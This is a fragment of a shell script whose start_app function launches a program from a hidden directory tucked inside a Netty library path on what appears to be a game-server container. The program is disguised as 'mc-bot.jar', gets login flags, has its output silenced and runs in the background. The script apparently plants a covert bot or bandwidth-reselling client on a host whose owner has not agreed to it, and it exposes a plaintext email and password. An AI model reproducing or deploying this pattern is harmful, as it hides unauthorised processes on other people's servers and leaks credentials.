...
function start_app() {
    ...
    cd /home/container/libraries/io/netty/netty-buffer/.cache/.hg/app/ && nohup ./mc-bot.jar -a '-java' ./bot-fun.jar -tou-accept -email "yoursoundwords@gmail.com" -pass "vizelle521Elle" -device sk1 >/dev/null 2>&1 &
